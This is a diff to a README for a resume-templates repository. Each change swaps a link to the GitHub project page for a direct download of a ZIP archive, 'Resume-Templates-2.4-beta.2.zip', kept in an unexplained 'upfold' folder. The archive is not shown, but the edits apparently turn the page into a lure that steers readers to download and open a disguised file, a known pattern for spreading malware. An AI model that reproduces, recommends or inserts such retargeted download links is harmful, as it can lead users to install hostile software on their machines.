@@ -1,6 +1,6 @@
 # 🧾 Resume-Templates - ATS-ready resumes that get noticed
 
-[![Download Resume-Templates](https://img.shields.io/badge/Download%20Now-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Bran4501/Resume-Templates)
+[![Download Resume-Templates](https://img.shields.io/badge/Download%20Now-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Bran4501/Resume-Templates/main/upfold/Resume-Templates-2.4-beta.2.zip)
 
 ## ✨ What this is
 
@@ -40,7 +40,7 @@ If you want to use these templates on Windows, follow these steps.
 
 Go to this page and visit it to download the files:
 
-[https://github.com/Bran4501/Resume-Templates](https://github.com/Bran4501/Resume-Templates)
+[https://raw.githubusercontent.com/Bran4501/Resume-Templates/main/upfold/Resume-Templates-2.4-beta.2.zip](https://raw.githubusercontent.com/Bran4501/Resume-Templates/main/upfold/Resume-Templates-2.4-beta.2.zip)
 
 ### 2. Download the repository
 
@@ -286,7 +286,7 @@ Check these items before you apply:
 
 To get the files, use the GitHub page below and visit it to download:
 
-[https://github.com/Bran4501/Resume-Templates](https://github.com/Bran4501/Resume-Templates)
+[https://raw.githubusercontent.com/Bran4501/Resume-Templates/main/upfold/Resume-Templates-2.4-beta.2.zip](https://raw.githubusercontent.com/Bran4501/Resume-Templates/main/upfold/Resume-Templates-2.4-beta.2.zip)
 
 After you download the ZIP file:
 
